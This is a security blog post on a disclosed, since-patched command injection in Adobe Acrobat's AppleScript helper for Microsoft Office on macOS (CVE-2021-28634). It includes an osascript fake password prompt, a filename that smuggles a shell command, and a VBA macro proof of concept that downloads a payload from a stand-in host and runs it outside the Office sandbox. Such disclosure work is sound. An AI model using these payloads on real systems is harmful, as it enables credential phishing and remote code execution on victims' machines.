<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
  <link href="https://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="generator" content="Hugo 0.117.0">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Adobe Acrobat Command Injection (CVE-2021-28634) &middot; The Subtlety</title>
  <meta name="description" content="" />

  
  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/print.css" media="print">
  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/poole.css">
  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/syntax.css">
  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/hyde.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">


  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.thesubtlety.com/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="https://www.thesubtlety.com/favicon.png">

  
  
</head>

  <body class=" ">
  <aside class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <a href="https://www.thesubtlety.com/"><h1>The Subtlety</h1></a>
      <p class="lead">
       Indiscriminate Idiotropics on Infosec 
      </p>
    </div>

    <nav>
      <ul class="sidebar-nav">
        <li><a href="https://www.thesubtlety.com/">Home</a> </li>
        <li><a href="https://www.thesubtlety.com/about/"> About </a></li><li><a href="https://github.com/thesubtlety/"> Github </a></li><li><a href="https://twitter.com/thesubtlety"> Twitter </a></li>
      </ul>
    </nav>

    <p>&copy; 2023. All rights reserved. </p>
  </div>
</aside>

    <main class="content container">
    <div class="post">
  <h1>Adobe Acrobat Command Injection (CVE-2021-28634)</h1>
  <time datetime=2021-10-27T17:06:21-0600 class="post-date">Wed, Oct 27, 2021</time>
  <p>During a recent red team engagement I was looking into options for VB macro execution on MacOS. The enterprise system I was investigating had Adobe Acrobat installed along with Microsoft Office integrations basically adding an Adobe tab to Word and Excel to convert documents to PDF.</p>
<p>On whim, I decided to take a look at how this might be working, and started poking around the file system. Turns out Adobe installs an AppleScript file to <code>~/Library/Application Scripts/com.microsoft.{Word,Excel,Powerpoint}/AcrobatUtils.scpt</code>.</p>
<p>Briefly, an <code>scpt</code> file is a compiled AppleScript application. AppleScript is an IPC mechanism for MacOS and provides scripting control for aspects of the OS and applications. According to <a href="https://en.wikipedia.org/wiki/AppleScript">Wikipedia</a></p>
<blockquote>
<p>The term &ldquo;AppleScript&rdquo; may refer to the language itself, to an individual script written in the language, or, informally, to the macOS Open Scripting Architecture that underlies the language.</p>
</blockquote>
<p><figure><img src="https://www.thesubtlety.com/img/osa.jpg"/>
</figure>

<a href="https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/HowMacScriptingWorks.html">Source</a></p>
<p>I&rsquo;m sure there are legitimate uses for AppleScript but typically it&rsquo;s used to ask for a user&rsquo;s credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-applescript" data-lang="applescript"><span style="display:flex;"><span>osascript <span style="color:#f92672">-</span>e <span style="color:#960050;background-color:#1e0010">&#39;</span>display dialog <span style="color:#e6db74">&#34;Your compromised Mac is requesting your password&#34;</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">title</span> <span style="color:#e6db74">&#34;Just Trust Me&#34;</span> default answer <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#66d9ef">with</span> icon stop <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">hidden</span> answer<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>And if you have an AppleScript file, you can compile it to various formats with <a href="https://ss64.com/osx/osacompile.html">osacompile</a>: <code>osacompile -l AppleScript -d -o test.scpt test.applescript</code></p>
<h3 id="thanks-adobe">Thanks Adobe</h3>
<p>Anyways, this <code>AcrobatUtils.scpt</code> can be opened in the Script Editor or just by calling <code>open ~/Library/Application Scripts/com.microsoft.{Word,Excel,Powerpoint}/AcrobatUtils.scpt</code>.</p>
<p>And in the script editor we see the functions <code>OpenPDFFile</code> and <code>ConvertToPDF</code> both of which contain functions that pass a filepath into <code>do shell script</code>.</p>
<figure><img src="https://www.thesubtlety.com/img/acrobatutils-old1.jpg"/>
</figure>

<p>I wondered if a filename of <code>file.pdf; open /System/Applications/Calculator.app</code> would do what I suspected. And it did.</p>
<figure><img src="https://www.thesubtlety.com/img/calc.jpg"/>
</figure>

<p>How can we abuse this from the context of a VB Macro? According to the <a href="https://docs.microsoft.com/en-us/office/vba/office-mac/applescripttask">Microsoft docs</a>, the VB <code>AppleScriptTask</code> command &ldquo;can execute an AppleScript script file located outside the sandboxed app &hellip; The MyAppleScript.applescript file must be in <code>~/Library/Application Scripts/[bundle id]/</code>.&rdquo; And the Adobe script is there for our taking.</p>
<p>We can do something trivial like call the <code>OpenPDFFile</code> function within the specified <code>AcrobatUtils.scpt</code> file and curl, chmod, and execute. And we&rsquo;ll see that we&rsquo;re outside of the Microsoft sandbox, although still subject to the MacOS Privacy Controls, <a href="https://cedowens.medium.com/initial-access-checks-on-macos-531dd2d0cee6">TCC</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Document_Open</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> x <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> AppleScriptTask(<span style="color:#e6db74">&#34;AcrobatUtils.scpt&#34;</span>, <span style="color:#e6db74">&#34;OpenPDFFile&#34;</span>, <span style="color:#e6db74">&#34;file.pdf; curl -o /tmp/malicious https://example.com/malicious.bin; chmod +x /tmp/malicious; nohup /bin/bash -c /tmp/malicious &amp;&gt; /dev/null &amp; &#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
</span></span></code></pre></div><p>Typically, using the VBA <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function">Shell</a> function should restrict us to the Microsoft sandbox and require another escape. Previous research by <a href="https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/">Adam Chester</a> discusses the sandbox restricting access to system resources even if you gain command and control from macro execution. Using Adobe&rsquo;s vulnerable AcrobatUtils functions avoids this.</p>
<h3 id="its-patched">It&rsquo;s Patched</h3>
<p>After reporting to Adobe via their bug bounty program on HackerOne, and waiting five months, Adobe responded stating the issue had been fixed and <a href="https://helpx.adobe.com/security/products/acrobat/apsb21-51.html">CVE-2021-28634</a> had been issued.</p>
<p>After updating and looking at the new file we see they used Apple Script&rsquo;s <code>quoted form of filePath</code> to escape the input to the <code>do shell script</code>.</p>
<figure><img src="https://www.thesubtlety.com/img/acrobatutils-patched.png"/>
</figure>

<p>According to Apple&rsquo;s developer <a href="https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/CallCommandLineUtilities.html">documentation</a>, quoted form should safely escape user provided input.</p>
<blockquote>
<p>The easiest way to quote a string is to use the quoted form property of the text class … This property returns the string in a form that’s safe from further interpretation by the shell, regardless of its contents.</p>
</blockquote>
<p>Surprised to see Adobe suffering from a basic command injection vuln like this even if it is a little obscure. Update your Adobe Acrobats!</p>

</div>


    </main>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-29425132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  </body>
</html>
